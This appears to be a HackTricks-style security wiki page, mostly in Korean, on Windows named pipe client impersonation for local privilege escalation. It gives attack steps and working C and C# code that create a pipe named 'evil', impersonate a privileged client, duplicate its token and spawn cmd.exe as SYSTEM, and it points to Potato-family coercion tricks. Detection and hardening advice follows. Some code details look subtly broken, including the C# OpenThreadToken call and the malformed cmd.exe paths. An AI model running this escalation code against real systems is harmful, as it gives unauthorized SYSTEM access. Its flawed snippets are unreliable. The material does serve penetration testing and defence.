# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation은 연결된 클라이언트의 보안 컨텍스트를 채택할 수 있게 해주는 로컬 권한 상승 primitive입니다. 실제로 SeImpersonatePrivilege로 코드를 실행할 수 있는 공격자는 권한 있는 클라이언트(예: SYSTEM 서비스)를 공격자가 제어하는 파이프에 연결하도록 유도하고, ImpersonateNamedPipeClient를 호출한 뒤 생성된 토큰을 primary 토큰으로 복제하여 클라이언트 계정(종종 NT AUTHORITY\SYSTEM)으로 프로세스를 실행할 수 있습니다.

이 페이지는 핵심 기법에 중점을 둡니다. SYSTEM을 당신의 파이프로 강제로 연결시키는 end-to-end exploit chains에 대해서는 아래에 참조된 Potato family 페이지들을 보세요.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- 권한 있는 구성요소가 여기에 연결하도록 만드세요 (spooler/DCOM/EFSRPC/etc.).
- 파이프에서 적어도 하나의 메시지를 읽은 다음 ImpersonateNamedPipeClient를 호출하세요.
- 현재 스레드에서 임퍼소네이션 토큰을 열고, DuplicateTokenEx(TokenPrimary)로 복제한 뒤 CreateProcessWithTokenW/CreateProcessAsUser로 SYSTEM 프로세스를 얻으세요.

## 요구 사항 및 주요 API
- 호출 프로세스/스레드가 일반적으로 필요로 하는 권한:
- SeImpersonatePrivilege — 연결된 클라이언트를 성공적으로 임퍼소네이트하고 CreateProcessWithTokenW를 사용하기 위해 필요합니다.
- 또는 SYSTEM을 임퍼소네이트한 상태에서 CreateProcessAsUser를 사용할 수 있으며, 이 경우 SeAssignPrimaryTokenPrivilege 및 SeIncreaseQuotaPrivilege가 필요할 수 있습니다(이 권한들은 SYSTEM을 임퍼소네이트한 상태에서는 충족됩니다).
- 사용되는 핵심 API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (임퍼소네이션 전에 적어도 하나의 메시지를 읽어야 함)
- ImpersonateNamedPipeClient 및 RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- 임퍼소네이션 레벨: 로컬에서 유용한 작업을 수행하려면 클라이언트가 SecurityImpersonation을 허용해야 합니다(많은 로컬 RPC/명명된 파이프 클라이언트의 기본값). 클라이언트는 파이프를 열 때 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION로 이를 낮출 수 있습니다.

## 최소 Win32 워크플로우 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
참고:
- ImpersonateNamedPipeClient가 ERROR_CANNOT_IMPERSONATE (1368)를 반환할 경우, 먼저 파이프에서 읽었는지 확인하고 클라이언트가 impersonation을 Identification level로 제한하지 않았는지 확인하세요.
- 프로세스 생성에 적합한 primary token을 만들려면 DuplicateTokenEx를 SecurityImpersonation 및 TokenPrimary와 함께 사용하는 것이 좋습니다.

## .NET 빠른 예제
.NET에서는 NamedPipeServerStream가 RunAsClient를 통해 impersonate할 수 있습니다. 일단 impersonate한 후에는 thread token을 복제하여 프로세스를 생성하세요.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM을 당신의 pipe로 유도하는 일반적인 트리거/강제 방법
이 기술들은 권한 있는 서비스가 당신의 named pipe에 연결하도록 강제하여 해당 서비스를 가장할 수 있게 합니다:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

자세한 사용법 및 호환성은 다음을 참조하세요:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

서비스 트리거로부터 SYSTEM을 spawn하기 위해 파이프를 제작하고 가장하는 전체 예제가 필요하면 다음을 참조하세요:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## 문제 해결 및 주의 사항
- ImpersonateNamedPipeClient를 호출하기 전에 pipe에서 적어도 하나의 메시지를 읽어야 합니다; 그렇지 않으면 ERROR_CANNOT_IMPERSONATE (1368)가 발생합니다.
- 클라이언트가 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION으로 연결하면 서버가 완전히 가장할 수 없습니다; GetTokenInformation(TokenImpersonationLevel)를 통해 토큰의 impersonation level을 확인하세요.
- CreateProcessWithTokenW는 호출자에게 SeImpersonatePrivilege가 필요합니다. 만약 ERROR_PRIVILEGE_NOT_HELD (1314)로 실패하면, 이미 SYSTEM을 가장한 상태에서 CreateProcessAsUser를 사용하세요.
- 파이프를 강화(harden)했다면 대상 서비스가 연결할 수 있도록 파이프의 security descriptor를 확인하세요; 기본적으로 \\.\pipe 아래의 파이프는 서버의 DACL에 따라 접근 가능합니다.

## 탐지 및 하드닝
- named pipe 생성 및 연결을 모니터링하세요. Sysmon Event IDs 17 (Pipe Created) 및 18 (Pipe Connected)는 정상적인 pipe 이름을 기준으로 삼고 토큰 조작 이벤트에 앞서는 비정상적이거나 무작위같은 pipe를 포착하는 데 유용합니다.
- 다음과 같은 순서를 찾아보세요: 프로세스가 pipe를 생성 → SYSTEM 서비스가 연결 → 생성한 프로세스가 SYSTEM으로 자식 프로세스를 spawn.
- 비필수 서비스 계정에서 SeImpersonatePrivilege를 제거하고, 높은 권한으로의 불필요한 서비스 로그온을 피하여 노출을 줄이세요.
- 방어적 개발: 신뢰할 수 없는 named pipe에 연결할 때, 서버가 불필요하게 클라이언트를 완전히 가장하지 못하도록 SECURITY_SQOS_PRESENT와 SECURITY_IDENTIFICATION을 지정하세요.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
